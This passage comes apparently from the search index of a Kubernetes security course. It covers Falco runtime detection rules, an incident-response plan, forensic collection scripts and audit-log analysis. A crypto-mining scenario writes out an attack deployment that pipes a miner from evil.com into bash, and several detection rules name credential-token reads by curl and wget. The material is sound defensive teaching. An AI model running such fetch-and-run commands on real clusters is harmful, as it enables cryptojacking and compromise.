process reading service account token\n  condition: &gt;\n    open_read and\n    fd.name glob \"/var/run/secrets/kubernetes.io/serviceaccount/token\" and\n    proc.name in (bash, sh, curl, wget)\n  output: &gt;\n    Service account token accessed by suspicious process\n    (process=%proc.name file=%fd.name\n    pod=%k8s.pod.name namespace=%k8s.ns.name)\n  priority: WARNING\n  tags: [credentials, service_account]\n</code></pre></p>"},{"location":"11-runtime-security/#83-scenario-3-crypto-mining","title":"8.3 Scenario 3: Crypto Mining","text":"<p>Attack: <pre><code># Malicious deployment\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: innocent-app\nspec:\n  replicas: 10\n  template:\n    spec:\n      containers:\n      - name: app\n        image: nginx\n        command: [\"/bin/sh\"]\n        args: [\"-c\", \"apt update &amp;&amp; apt install -y wget &amp;&amp; wget -O - https://evil.com/xmrig | bash\"]\n</code></pre></p> <p>Detection: <pre><code>- rule: Cryptocurrency Mining Process\n  desc: Detect known crypto mining binaries or patterns\n  condition: &gt;\n    spawned_process and\n    (proc.name in (xmrig, ethminer, cgminer) or\n     proc.cmdline contains \"stratum+tcp\" or\n     proc.cmdline contains \"--donate-level\")\n  output: &gt;\n    Cryptocurrency mining detected\n    (process=%proc.name cmdline=%proc.cmdline\n    pod=%k8s.pod.name namespace=%k8s.ns.name\n    cpu=%evt.cpu.usage)\n  priority: CRITICAL\n  tags: [malware, crypto_mining]\n</code></pre></p>"},{"location":"11-runtime-security/#summary","title":"Summary","text":"<p>This module covered:</p> <ol> <li>Runtime Threat Detection - Principles, methodologies, and tools</li> <li>Falco Deployment - Installation, configuration, and integration</li> <li>Custom Rules - Application-specific and threat-based detection</li> <li>Host Hardening - Kernel parameters, AppArmor, SELinux, secure boot</li> <li>API Server Security - Authentication, authorization, admission control</li> <li>etcd Security - TLS, encryption at rest, access control</li> <li>Kubelet Hardening - Configuration, TLS, resource management</li> <li>Real-World Scenarios - Container escapes, credential theft, mining</li> </ol>"},{"location":"11-runtime-security/#hands-on-labs","title":"Hands-On Labs","text":"<ol> <li>Deploy Falco and test with intentional violations</li> <li>Create custom rules for your application stack</li> <li>Implement comprehensive host hardening</li> <li>Configure API server with all security features</li> <li>Enable etcd encryption at rest and verify</li> <li>Harden kubelet with recommended settings</li> <li>Simulate attacks and validate detection</li> </ol>"},{"location":"11-runtime-security/#additional-resources","title":"Additional Resources","text":"<ul> <li>Falco Documentation</li> <li>NIST SP 800-190: Container Security</li> <li>CIS Kubernetes Benchmark</li> <li>Kubernetes Security Hardening Guide</li> <li>etcd Security Model</li> </ul> <p>Next Module: Module 12 - Incident Response</p>"},{"location":"12-incident-response/","title":"Module 12: Incident Response","text":""},{"location":"12-incident-response/#overview","title":"Overview","text":"<p>Estimated Time: 8-9 hours</p> <p>Module Type: Security Operations and Incident Management</p> <p>Prerequisites: - Module 08 - Observability and Monitoring - Module 11 - Runtime Security - Understanding of NIST Incident Response Framework - Familiarity with forensic analysis and evidence handling - Knowledge of Kubernetes audit logging</p> <p>Incident response is critical for minimizing damage and recovery time when security incidents occur. This module covers the complete incident response lifecycle based on NIST SP 800-61, Kubernetes-specific forensics techniques, audit log analysis, container breakout detection, containment strategies, evidence preservation, and post-incident review processes. Built on industry best practices from SANS Incident Handler's Handbook and real-world Kubernetes security incidents.</p>"},{"location":"12-incident-response/#learning-objectives","title":"Learning Objectives","text":"<p>By the end of this module, you will be able to:</p> <ol> <li>Implement NIST incident response framework for Kubernetes</li> <li>Perform forensic analysis on compromised containers and nodes</li> <li>Analyze Kubernetes audit logs with jq and specialized tools</li> <li>Detect and respond to container breakout attempts</li> <li>Implement effective containment strategies using NetworkPolicy and RBAC</li> <li>Collect and preserve evidence for investigation</li> <li>Conduct post-incident reviews and extract lessons learned</li> <li>Develop incident response playbooks for common scenarios</li> <li>Integrate IR processes with SIEM and alerting systems</li> <li>Build and maintain incident response capabilities</li> </ol>"},{"location":"12-incident-response/#1-incident-response-lifecycle","title":"1. Incident Response Lifecycle","text":""},{"location":"12-incident-response/#11-nist-ir-framework-for-kubernetes","title":"1.1 NIST IR Framework for Kubernetes","text":"<pre><code>graph TB\n    subgraph \"1. Preparation\"\n        A1[IR Plan &amp; Playbooks] --&gt; A2[Monitoring &amp; Detection]\n        A2 --&gt; A3[Team Training]\n        A3 --&gt; A4[Tool Setup]\n    end\n\n    subgraph \"2. Detection &amp; Analysis\"\n        B1[Alert Triggered] --&gt; B2[Triage &amp; Validation]\n        B2 --&gt; B3[Scope Assessment]\n        B3 --&gt; B4[Impact Analysis]\n    end\n\n    subgraph \"3. Containment\"\n        C1[Short-term Containment] --&gt; C2[Forensic Collection]\n        C2 --&gt; C3[Long-term Containment]\n        C3 --&gt; C4[Eradication Planning]\n    end\n\n    subgraph \"4. Eradication\"\n        D1[Remove Threat] --&gt; D2[Patch Vulnerabilities]\n        D2 --&gt; D3[Update Defenses]\n        D3 --&gt; D4[Verify Removal]\n    end\n\n    subgraph \"5. Recovery\"\n        E1[Restore Services] --&gt; E2[Monitor for Recurrence]\n        E2 --&gt; E3[Validate Security]\n        E3 --&gt; E4[Return to Normal]\n    end\n\n    subgraph \"6. Post-Incident\"\n        F1[Document Incident] --&gt; F2[Lessons Learned]\n        F2 --&gt; F3[Update Procedures]\n        F3 --&gt; F4[Improve Defenses]\n    end\n\n    A4 --&gt; B1\n    B4 --&gt; C1\n    C4 --&gt; D1\n    D4 --&gt; E1\n    E4 --&gt; F1\n    F4 --&gt; A1\n\n    style B1 fill:#ff6b6b\n    style C1 fill:#ffa500\n    style D1 fill:#ffff00\n    style E1 fill:#90ee90\n    style F1 fill:#4169e1</code></pre>"},{"location":"12-incident-response/#12-preparation-phase","title":"1.2 Preparation Phase","text":"<p>1.2.1 Incident Response Plan Template</p> <pre><code># Kubernetes Incident Response Plan\n\n## 1. Team Structure\n- **Incident Commander**: Makes key decisions, coordinates response\n- **Security Analyst**: Investigates and analyzes threats\n- **Forensics Specialist**: Collects and preserves evidence\n- **Communications Lead**: Handles internal/external communications\n- **Technical Lead**: Implements containment and remediation\n\n## 2. Contact Information\n| Role | Name | Phone | Email | Backup |\n|------|------|-------|-------|--------|\n| IC   | John Doe | +1-555-0100 | john@example.com | Jane Smith |\n\n## 3. Escalation Paths\n- **P1 (Critical)**: Immediate escalation to CTO, notify legal within 1 hour\n- **P2 (High)**: Notify engineering lead within 2 hours\n- **P3 (Medium)**: Standard on-call process\n- **P4 (Low)**: Document and address during business hours\n\n## 4. Communication Channels\n- War Room: #incident-response (Slack)\n- Video: Zoom bridge (always-on during P1/P2)\n- Documentation: Confluence incident page\n- Updates: Status page, stakeholder email list\n\n## 5. Tool Inventory\n- SIEM: Splunk (https://siem.example.com)\n- Log Aggregation: ELK Stack\n- Forensics: kubectl, etcdctl, docker/containerd tools\n- Evidence Storage: S3 bucket s3://incident-evidence/\n- Backup Cluster: cluster-dr.example.com\n</code></pre> <p>1.2.2 Detection Tools Setup</p> <pre><code># alertmanager-config.yaml\napiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: alertmanager-config\n  namespace: monitoring\ndata:\n  alertmanager.yml: |\n    global:\n      resolve_timeout: 5m\n      slack_api_url: 'https://hooks.slack.com/services/YOUR/WEBHOOK/URL'\n\n    route:\n      group_by: ['alertname', 'cluster', 'namespace']\n      group_wait: 10s\n      group_interval: 10s\n      repeat_interval: 12h\n      receiver: 'security-team'\n\n      routes:\n      # Critical security alerts\n      - match:\n          severity: critical\n          category: security\n        receiver: 'security-critical'\n        group_wait: 0s\n        repeat_interval: 5m\n        continue: true\n\n      # Container breakout attempts\n      - match:\n          alertname: ContainerEscapeAttempt\n        receiver: 'security-critical'\n        group_wait: 0s\n\n      # Cryptocurrency mining\n      - match:\n          alertname: CryptoMiningDetected\n        receiver: 'security-high'\n\n    receivers:\n    - name: 'security-critical'\n      slack_configs:\n      - channel: '#security-critical'\n        title: 'CRITICAL SECURITY ALERT'\n        text: '{{ range .Alerts }}{{ .Annotations.description }}{{ end }}'\n        send_resolved: true\n      pagerduty_configs:\n      - service_key: 'YOUR_PAGERDUTY_KEY'\n        severity: 'critical'\n      webhook_configs:\n      - url: 'https://incident-response.example.com/webhook'\n\n    - name: 'security-high'\n      slack_configs:\n      - channel: '#security-alerts'\n        title: 'High Priority Security Alert'\n        text: '{{ range .Alerts }}{{ .Annotations.description }}{{ end }}'\n\n    - name: 'security-team'\n      slack_configs:\n      - channel: '#security'\n        text: '{{ range .Alerts }}{{ .Annotations.summary }}{{ end }}'\n\n    inhibit_rules:\n    - source_match:\n        severity: 'critical'\n      target_match:\n        severity: 'warning'\n      equal: ['alertname', 'cluster', 'namespace']\n</code></pre> <p>1.2.3 Incident Response Runbook</p> <pre><code>#!/bin/bash\n# incident-response-init.sh\n\nset -e\n\necho \"=== Kubernetes Incident Response Initialization ===\"\necho \"Incident ID: $(date +%Y%m%d-%H%M%S)\"\n\n# Create incident working directory\nINCIDENT_ID=\"INC-$(date +%Y%m%d-%H%M%S)\"\nINCIDENT_DIR=\"/var/incident-response/${INCIDENT_ID}\"\nmkdir -p \"${INCIDENT_DIR}\"/{logs,evidence,analysis,reports}\n\necho \"Incident Directory: ${INCIDENT_DIR}\"\n\n# Collect initial state\necho \"[1/6] Collecting cluster state...\"\nkubectl get nodes -o wide &gt; \"${INCIDENT_DIR}/logs/nodes.txt\"\nkubectl get pods --all-namespaces -o wide &gt; \"${INCIDENT_DIR}/logs/pods.txt\"\nkubectl get events --all-namespaces --sort-by='.lastTimestamp' &gt; \"${INCIDENT_DIR}/logs/events.txt\"\n\necho \"[2/6] Collecting audit logs...\"\nkubectl logs -n kube-system kube-apiserver-* --tail=10000 &gt; \"${INCIDENT_DIR}/logs/apiserver.log\"\n\necho \"[3/6] Collecting security events...\"\nkubectl logs -n falco -l app=falco --tail=5000 &gt; \"${INCIDENT_DIR}/logs/falco.log\"\n\necho \"[4/6] Collecting network policies...\"\nkubectl get networkpolicies --all-namespaces -o yaml &gt; \"${INCIDENT_DIR}/logs/network-policies.yaml\"\n\necho \"[5/6] Collecting RBAC configuration...\"\nkubectl get clusterroles,clusterrolebindings -o yaml &gt; \"${INCIDENT_DIR}/logs/rbac.yaml\"\n\necho \"[6/6] Taking etcd snapshot...\"\nETCDCTL_API=3 etcdctl snapshot save \"${INCIDENT_DIR}/evidence/etcd-snapshot.db\" \\\n  --endpoints=https://127.0.0.1:2379 \\\n  --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n  --cert=/etc/kubernetes/pki/etcd/server.crt \\\n  --key=/etc/kubernetes/pki/etcd/server.key\n\necho \"=== Initialization Complete ===\"\necho \"Evidence Location: ${INCIDENT_DIR}\"\necho \"Next Steps:\"\necho \"1. Review Falco alerts: cat ${INCIDENT_DIR}/logs/falco.log | grep CRITICAL\"\necho \"2. Analyze suspicious pods: grep -i 'suspect_pod_name' ${INCIDENT_DIR}/logs/pods.txt\"\necho \"3. Review recent events: tail -100 ${INCIDENT_DIR}/logs/events.txt\"\n</code></pre>"},{"location":"12-incident-response/#13-detection-and-analysis-phase","title":"1.3 Detection and Analysis Phase","text":"<p>Triage Checklist:</p> <pre><code># Incident Triage Checklist\n\n## Initial Assessment (5 minutes)\n- [ ] What is the alert/event that triggered investigation?\n- [ ] What is the affected resource (pod, node, namespace)?\n- [ ] When did the incident occur (timestamp)?\n- [ ] Is this a false positive? (Check known patterns)\n- [ ] What is the initial severity assessment?\n\n## Scope Determination (15 minutes)\n- [ ] Which clusters are affected?\n- [ ] Which namespaces/applications are involved?\n- [ ] How many pods/nodes are compromised?\n- [ ] Are there indicators of lateral movement?\n- [ ] What data/systems are at risk?\n\n## Impact Analysis (15 minutes)\n- [ ] Is there active data exfiltration?\n- [ ] Are production services impacted?\n- [ ] Is there privilege escalation?\n- [ ] Are customer data or credentials compromised?\n- [ ] What is the business impact?\n\n## Classification\n- [ ] Assign severity: P1/P2/P3/P4\n- [ ] Assign category: Malware/Intrusion/Data Breach/DoS/Other\n- [ ] Determine if escalation is needed\n- [ ] Create incident ticket and notify team\n</code></pre>"},{"location":"12-incident-response/#2-kubernetes-forensics-techniques","title":"2. Kubernetes Forensics Techniques","text":""},{"location":"12-incident-response/#21-container-forensics","title":"2.1 Container Forensics","text":"<p>2.1.1 Live Container Analysis</p> <pre><code>#!/bin/bash\n# container-forensics.sh\n\nNAMESPACE=\"$1\"\nPOD_NAME=\"$2\"\nCONTAINER_NAME=\"$3\"\nOUTPUT_DIR=\"./forensics/${POD_NAME}\"\n\nmkdir -p \"${OUTPUT_DIR}\"\n\necho \"=== Container Forensics: ${NAMESPACE}/${POD_NAME}/${CONTAINER_NAME} ===\"\n\n# 1. Collect container metadata\necho \"[1/10] Collecting metadata...\"\nkubectl get pod -n \"${NAMESPACE}\" \"${POD_NAME}\" -o yaml &gt; \"${OUTPUT_DIR}/pod-spec.yaml\"\nkubectl describe pod -n \"${NAMESPACE}\" \"${POD_NAME}\" &gt; \"${OUTPUT_DIR}/pod-description.txt\"\n\n# 2. Collect logs\necho \"[2/10] Collecting logs...\"\nkubectl logs -n \"${NAMESPACE}\" \"${POD_NAME}\" -c \"${CONTAINER_NAME}\" &gt; \"${OUTPUT_DIR}/container.log\"\nkubectl logs -n \"${NAMESPACE}\" \"${POD_NAME}\" -c \"${CONTAINER_NAME}\" --previous &gt; \"${OUTPUT_DIR}/container-previous.log\" 2&gt;/dev/null || true\n\n# 3. Collect process list\necho \"[3/10] Collecting process list...\"\nkubectl exec -n \"${NAMESPACE}\" \"${POD_NAME}\" -c \"${CONTAINER_NAME}\" -- ps auxf &gt; \"${OUTPUT_DIR}/processes.txt\"\n\n# 4. Collect network connections\necho \"[4/10] Collecting network connections...\"\nkubectl exec -n \"${NAMESPACE}\" \"${POD_NAME}\" -c \"${CONTAINER_NAME}\" -- netstat -tulpn &gt; \"${OUTPUT_DIR}/network-connections.txt\" 2&gt;/dev/null || true\nkubectl exec -n \"${NAMESPACE}\" \"${POD_NAME}\" -c \"${CONTAINER_NAME}\" -- ss -tulpn &gt; \"${OUTPUT_DIR}/network-ss.txt\" 2&gt;/dev/null || true\n\n# 5. Collect environment variables (may contain secrets!)\necho \"[5/10] Collecting environment...\"\nkubectl exec -n \"${NAMESPACE}\" \"${POD_NAME}\" -c \"${CONTAINER_NAME}\" -- env &gt; \"${OUTPUT_DIR}/environment.txt\"\n\n# 6. Collect file system changes\necho \"[6/10] Checking file system modifications...\"\nkubectl exec -n \"${NAMESPACE}\" \"${POD_NAME}\" -c \"${CONTAINER_NAME}\" -- find / -type f -mtime -1 2&gt;/dev/null &gt; \"${OUTPUT_DIR}/recent-files.txt\" || true\n\n# 7. Check for suspicious files\necho \"[7/10] Looking for suspicious files...\"\nkubectl exec -n \"${NAMESPACE}\" \"${POD_NAME}\" -c \"${CONTAINER_NAME}\" -- find / -name \"*.sh\" -o -name \"*.elf\" -o -name \"xmrig\" 2&gt;/dev/null &gt; \"${OUTPUT_DIR}/suspicious-files.txt\" || true\n\n# 8. Collect cron jobs\necho \"[8/10] Checking cron jobs...\"\nkubectl exec -n \"${NAMESPACE}\" \"${POD_NAME}\" -c \"${CONTAINER_NAME}\" -- crontab -l &gt; \"${OUTPUT_DIR}/crontab.txt\" 2&gt;/dev/null || true\n\n# 9. Check for backdoors in common locations\necho \"[9/10] Checking for backdoors...\"\nkubectl exec -n \"${NAMESPACE}\" \"${POD_NAME}\" -c \"${CONTAINER_NAME}\" -- cat /etc/passwd &gt; \"${OUTPUT_DIR}/passwd.txt\" 2&gt;/dev/null || true\nkubectl exec -n \"${NAMESPACE}\" \"${POD_NAME}\" -c \"${CONTAINER_NAME}\" -- cat ~/.bashrc &gt; \"${OUTPUT_DIR}/bashrc.txt\" 2&gt;/dev/null || true\nkubectl exec -n \"${NAMESPACE}\" \"${POD_NAME}\" -c \"${CONTAINER_NAME}\" -- cat ~/.bash_history &gt; \"${OUTPUT_DIR}/bash-history.txt\" 2&gt;/dev/null || true\n\n# 10. Capture full filesystem (if small enough)\necho \"[10/10] Attempting filesystem capture...\"\nkubectl exec -n \"${NAMESPACE}\" \"${POD_NAME}\" -c \"${CONTAINER_NAME}\" -- tar czf /tmp/fs-capture.tar.gz / 2&gt;/dev/null || true\nkubectl cp \"${NAMESPACE}/${POD_NAME}:/tmp/fs-capture.tar.gz\" \"${OUTPUT_DIR}/filesystem.tar.gz\" 2&gt;/dev/null || true\n\necho \"=== Forensics collection complete: ${OUTPUT_DIR} ===\"\n</code></pre> <p>2.1.2 Post-Mortem Container Analysis</p> <pre><code>#!/bin/bash\n# dead-container-forensics.sh\n\nNODE_NAME=\"$1\"\nCONTAINER_ID=\"$2\"\nOUTPUT_DIR=\"./forensics/${CONTAINER_ID}\"\n\nmkdir -p \"${OUTPUT_DIR}\"\n\necho \"=== Dead Container Forensics: ${CONTAINER_ID} on ${NODE_NAME} ===\"\n\n# SSH to node (or use kubectl debug node)\nssh \"${NODE_NAME}\" &lt;&lt; EOF\n  # Find container filesystem\n  CONTAINER_ROOT=\\$(find /var/lib/containerd -name \"${CONTAINER_ID}\" -type d | head -1)\n\n  if [ -z \"\\${CONTAINER_ROOT}\" ]; then\n    CONTAINER_ROOT=\\$(find /var/lib/docker -name \"${CONTAINER_ID}\" -type d | head -1)\n  fi\n\n  echo \"Container root: \\${CONTAINER_ROOT}\"\n\n  # Create forensic image\n  tar czf \"/tmp/${CONTAINER_ID}-forensics.tar.gz\" \"\\${CONTAINER_ROOT}\" 2&gt;/dev/null\n\n  # Collect container logs\n  journalctl -u containerd CONTAINER_ID=\"${CONTAINER_ID}\" &gt; \"/tmp/${CONTAINER_ID}-logs.txt\"\n\n  # Collect system logs around incident time\n  journalctl --since \"1 hour ago\" &gt; \"/tmp/${CONTAINER_ID}-system-logs.txt\"\nEOF\n\n# Copy back to analysis machine\nscp \"${NODE_NAME}:/tmp/${CONTAINER_ID}-*\" \"${OUTPUT_DIR}/\"\n\necho \"=== Forensics complete: ${OUTPUT_DIR} ===\"\n</code></pre>"},{"location":"12-incident-response/#22-node-forensics","title":"2.2 Node Forensics","text":"<p>2.2.1 Node Evidence Collection</p> <pre><code>#!/bin/bash\n# node-forensics.sh\n\nNODE_NAME=\"$1\"\nOUTPUT_DIR=\"./forensics/node-${NODE_NAME}\"\n\nmkdir -p \"${OUTPUT_DIR}\"\n\necho \"=== Node Forensics: ${NODE_NAME} ===\"\n\n# Use kubectl debug to create forensics pod on node\nkubectl debug node/\"${NODE_NAME}\" -it --image=nicolaka/netshoot -- /bin/bash &lt;&lt; 'FORENSICS'\n\n# Change to host root\nchroot /host /bin/bash\n\nOUTPUT=\"/tmp/node-forensics\"\nmkdir -p \"${OUTPUT}\"\n\n# 1. System information\necho \"[1/12] Collecting system info...\"\nuname -a &gt; \"${OUTPUT}/system-info.txt\"\nhostname &gt;&gt; \"${OUTPUT}/system-info.txt\"\nuptime &gt;&gt; \"${OUTPUT}/system-info.txt\"\n\n# 2. Running processes\necho \"[2/12] Collecting processes...\"\nps auxf &gt; \"${OUTPUT}/processes.txt\"\npstree -p &gt; \"${OUTPUT}/process-tree.txt\"\n\n# 3. Network connections\necho \"[3/12] Collecting network state...\"\nnetstat -tulpn &gt; \"${OUTPUT}/netstat.txt\"\nss -tulpn &gt; \"${OUTPUT}/ss.txt\"\niptables-save &gt; \"${OUTPUT}/iptables.txt\"\nip route show &gt; \"${OUTPUT}/routes.txt\"\n\n# 4. Loaded kernel modules\necho \"[4/12] Collecting kernel modules...\"\nlsmod &gt; \"${OUTPUT}/lsmod.txt\"\n\n# 5. Authentication logs\necho \"[5/12] Collecting auth logs...\"\ntail -10000 /var/log/auth.log &gt; \"${OUTPUT}/auth.log\" 2&gt;/dev/null || \\\n  tail -10000 /var/log/secure &gt; \"${OUTPUT}/secure.log\"\n\n# 6. System logs\necho \"[6/12] Collecting system logs...\"\njournalctl --since \"24 hours ago\" &gt; \"${OUTPUT}/journalctl.log\"\n\n# 7. Kubelet logs\necho \"[7/12] Collecting kubelet logs...\"\njournalctl -u kubelet --since \"24 hours ago\" &gt; \"${OUTPUT}/kubelet.log\"\n\n# 8. Container runtime logs\necho \"[8/12] Collecting container runtime logs...\"\njournalctl -u containerd --since \"24 hours ago\" &gt; \"${OUTPUT}/containerd.log\" 2&gt;/dev/null || \\\n  journalctl -u docker --since \"24 hours ago\" &gt; \"${OUTPUT}/docker.log\"\n\n# 9. Check for persistence mechanisms\necho \"[9/12] Checking persistence mechanisms...\"\ncrontab -l &gt; \"${OUTPUT}/root-crontab.txt\" 2&gt;/dev/null\ncat /etc/crontab &gt; \"${OUTPUT}/system-crontab.txt\"\nls -la /etc/cron.* &gt; \"${OUTPUT}/cron-dirs.txt\"\nsystemctl list-unit-files --type=service --state=enabled &gt; \"${OUTPUT}/enabled-services.txt\"\n\n# 10. Check for suspicious files\necho \"[10/12] Searching for suspicious files...\"\nfind /tmp -type f -executable &gt; \"${OUTPUT}/tmp-executables.txt\"\nfind /var/tmp -type f -executable &gt; \"${OUTPUT}/vartmp-executables.txt\"\nfind /dev/shm -type f &gt; \"${OUTPUT}/devshm-files.txt\"\n\n# 11. Check for rootkits\necho \"[11/12] Running rootkit checks...\"\nif command -v rkhunter &amp;&gt; /dev/null; then\n  rkhunter --check --skip-keypress --report-warnings-only &gt; \"${OUTPUT}/rkhunter.txt\"\nfi\n\n# 12. Memory dump (if available)\necho \"[12/12] Attempting memory capture...\"\nif command -v avml &amp;&gt; /dev/null; then\n  avml \"${OUTPUT}/memory.lime\" --compress\nfi\n\n# Create archive\ntar czf /tmp/node-forensics.tar.gz -C /tmp node-forensics/\n\necho \"=== Forensics complete: /tmp/node-forensics.tar.gz ===\"\n\nFORENSICS\n\n# Copy evidence from node\nkubectl cp \"${NODE_NAME}:/tmp/node-forensics.tar.gz\" \"${OUTPUT_DIR}/evidence.tar.gz\"\n\necho \"=== Evidence collected: ${OUTPUT_DIR}/evidence.tar.gz ===\"\n</code></pre>"},{"location":"12-incident-response/#3-audit-log-analysis","title":"3. Audit Log Analysis","text":""},{"location":"12-incident-response/#31-kubernetes-audit-policy","title":"3.1 Kubernetes Audit Policy","text":"<p>Comprehensive Audit Policy:</p> <pre><code># /etc/kubernetes/audit-policy.yaml\napiVersion: audit.k8s.io/v1\nkind: Policy\nomitStages:\n  - \"RequestReceived\"\nrules:\n  # Log all authentication failures\n  - level: Metadata\n    omitStages:\n      - \"RequestReceived\"\n    namespaces: [\"*\"]\n    verbs: [\"*\"]\n    userGroups: [\"system:unauthenticated\"]\n\n  # Log all Secret access\n  - level: RequestResponse\n    resources:\n      - group: \"\"\n        resources: [\"secrets\"]\n    omitStages:\n      - \"RequestReceived\"\n\n  # Log all ConfigMap changes\n  - level: Request\n    resources:\n      - group: \"\"\n        resources: [\"configmaps\"]\n    verbs: [\"create\", \"update\", \"patch\", \"delete\"]\n\n  # Log all RBAC changes\n  - level: RequestResponse\n    resources:\n      - group: \"rbac.authorization.k8s.io\"\n        resources: [\"clusterroles\", \"clusterrolebindings\", \"roles\", \"rolebindings\"]\n    verbs: [\"create\", \"update\", \"patch\", \"delete\"]\n\n  # Log pod exec/attach (potential attacker activity)\n  - level: Request\n    resources:\n      - group: \"\"\n        resources: [\"pods/exec\", \"pods/attach\", \"pods/portforward\"]\n    verbs: [\"create\"]\n\n  # Log privilege escalation attempts\n  - level: RequestResponse\n    resources:\n      - group: \"\"\n        resources: [\"pods\"]\n    verbs: [\"create\", \"update\", \"patch\"]\n    omitStages:\n      - \"RequestReceived\"\n\n  # Log admission webhook denials\n  - level: Request\n    omitStages:\n      - \"RequestReceived\"\n    namespaces: [\"*\"]\n    verbs: [\"create\", \"update\", \"patch\"]\n\n  # Log node changes\n  - level: RequestResponse\n    resources:\n      - group: \"\"\n        resources: [\"nodes\"]\n    verbs: [\"create\", \"update\", \"patch\", \"delete\"]\n\n  # Log authentication token creation\n  - level: Metadata\n    resources:\n      - group: \"\"\n        resources: [\"serviceaccounts/token\"]\n\n  # Don't log read-only requests\n  - level: None\n    verbs: [\"get\", \"list\", \"watch\"]\n\n  # Log everything else at Metadata level\n  - level: Metadata\n    omitStages:\n      - \"RequestReceived\"\n</code></pre>"},{"location":"12-incident-response/#32-audit-log-analysis-with-jq","title":"3.2 Audit Log Analysis with jq","text":"<p>Common Investigation Queries:</p> <pre><code>#!/bin/bash\n# audit-analysis.sh\n\nAUDIT_LOG=\"/var/log/kubernetes/audit.log\"\n\necho \"=== Kubernetes Audit Log Analysis ===\"\n\n# 1. Find all failed authentication attempts\necho \"[1] Failed Authentication Attempts:\"\ncat \"${AUDIT_LOG}\" | jq -r 'select(.responseStatus.code &gt;= 400) |\n  select(.user.username != \"system:anonymous\") |\n  \"\\(.timestamp) | User: \\(.user.username) | Verb: \\(.verb) | Resource: \\(.objectRef.resource) | Status: \\(.responseStatus.code)\"' | \\\n  sort | uniq -c | sort -rn | head -20\n\n# 2. Find all privileged pod creations\necho -e \"\\n[2] Privileged Pod Creations:\"\ncat \"${AUDIT_LOG}\" | jq -r 'select(.verb == \"create\") |\n  select(.objectRef.resource == \"pods\") |\n  select(.requestObject.spec.containers[]?.securityContext.privileged == true) |\n  \"\\(.timestamp) | Namespace: \\(.objectRef.namespace) | Pod: \\(.objectRef.name) | User: \\(.user.username)\"'\n\n# 3. Find all secret access\necho -e \"\\n[3] Secret Access:\"\ncat \"${AUDIT_LOG}\" | jq -r 'select(.objectRef.resource == \"secrets\") |\n  \"\\(.timestamp) | Verb: \\(.verb) | Namespace: \\(.objectRef.namespace) | Secret: \\(.objectRef.name) | User: \\(.user.username)\"' | \\\n  tail -50\n\n# 4. Find all RBAC changes\necho -e \"\\n[4] RBAC Changes:\"\ncat \"${AUDIT_LOG}\" | jq -r 'select(.objectRef.resource | test(\"role|rolebinding\")) |\n  select(.verb | test(\"create|update|patch|delete\")) |\n  \"\\(.timestamp) | Verb: \\(.verb) | Resource: \\(.objectRef.resource) | Name: \\(.objectRef.name) | User: \\(.user.username)\"'\n\n# 5. Find all exec/attach operations\necho -e \"\\n[5] Pod Exec/Attach Operations:\"\ncat \"${AUDIT_LOG}\" | jq -r 'select(.objectRef.subresource | test(\"exec|attach|portforward\")) |\n  \"\\(.timestamp) | Operation: \\(.objectRef.subresource) | Namespace: \\(.objectRef.namespace) | Pod: \\(.objectRef.name) | User: \\(.user.username) | Command: \\(.requestObject.command // \"N/A\" | @json)\"'\n\n# 6. Find unauthorized access attempts (403)\necho -e \"\\n[6] Unauthorized Access Attempts (403):\"\ncat \"${AUDIT_LOG}\" | jq -r 'select(.responseStatus.code == 403) |\n  \"\\(.timestamp) | User: \\(.user.username) | Verb: \\(.verb) | Resource: \\(.objectRef.resource)/\\(.objectRef.name) | Namespace: \\(.objectRef.namespace)\"' | \\\n  sort | uniq -c | sort -rn | head -20\n\n# 7. Find service account token creation\necho -e \"\\n[7] Service Account Token Creation:\"\ncat \"${AUDIT_LOG}\" | jq -r 'select(.objectRef.resource == \"serviceaccounts\") |\n  select(.objectRef.subresource == \"token\") |\n  \"\\(.timestamp) | Namespace: \\(.objectRef.namespace) | SA: \\(.objectRef.name) | User: \\(.user.username)\"'\n\n# 8. Find admission webhook denials\necho -e \"\\n[8] Admission Webhook Denials:\"\ncat \"${AUDIT_LOG}\" | jq -r 'select(.annotations.\"authorization.k8s.io/decision\" == \"forbid\" or .responseStatus.code &gt;= 400) |\n  select(.stage == \"ResponseComplete\") |\n  \"\\(.timestamp) | Verb: \\(.verb) | Resource: \\(.objectRef.resource) | Reason: \\(.responseStatus.reason) | User: \\(.user.username)\"' | \\\n  head -20\n\n# 9. Timeline of suspicious activity\necho -e \"\\n[9] Suspicious Activity Timeline (last hour):\"\nHOUR_AGO=$(date -u -d '1 hour ago' --iso-8601=seconds)\ncat \"${AUDIT_LOG}\" | jq -r --arg since \"$HOUR_AGO\" 'select(.timestamp &gt; $since) |\n  select(\n    (.responseStatus.code &gt;= 400) or\n    (.objectRef.resource == \"secrets\") or\n    (.objectRef.subresource | test(\"exec|attach\")) or\n    (.requestObject.spec.containers[]?.securityContext.privileged == true)\n  ) |\n  \"\\(.timestamp) | \\(.verb) \\(.objectRef.resource) | User: \\(.user.username) | Status: \\(.responseStatus.code)\"' | \\\n  sort\n\n# 10. User activity summary\necho -e \"\\n[10] Most Active Users (last 24 hours):\"\ncat \"${AUDIT_LOG}\" | jq -r '.user.username' | sort | uniq -c | sort -rn | head -20\n\necho -e \"\\n=== Analysis Complete ===\"\n</code></pre> <p>Advanced Audit Analysis - Detecting Anomalies:</p> <pre><code>#!/bin/bash\n# audit-anomaly-detection.sh\n\nAUDIT_LOG=\"/var/log/kubernetes/audit.log\"\n\n# Detect unusual API access patterns\necho \"=== Anomaly Detection ===\"\n\n# 1. Users accessing resources they don't normally access\necho \"[1] Unusual Resource Access by User:\"\ncat \"${AUDIT_LOG}\" | jq -r '\"\\(.user.username)|\\(.objectRef.resource)\"' | \\\n  sort | uniq -c | sort -rn | awk '$1 &lt; 5 {print}' | head -20\n\n# 2. API calls from unusual source IPs\necho -e \"\\n[2] Unusual Source IPs:\"\ncat \"${AUDIT_LOG}\" | jq -r '\"\\(.sourceIPs[]) | \\(.user.username)\"' | \\\n  sort | uniq -c | sort -rn | awk '$1 &lt; 3 {print}' | head -20\n\n# 3. Unusual timing (off-hours activity)\necho -e \"\\n[3] Off-Hours Activity (00:00-06:00 UTC):\"\ncat \"${AUDIT_LOG}\" | jq -r 'select(.timestamp | test(\"T0[0-6]:\")) |\n  \"\\(.timestamp) | \\(.user.username) | \\(.verb) \\(.objectRef.resource)\"' | \\\n  head -20\n\n# 4. Rapid-fire requests (potential automation/attack)\necho -e \"\\n[4] Rapid Request Patterns (&gt;50 req/min):\"\ncat 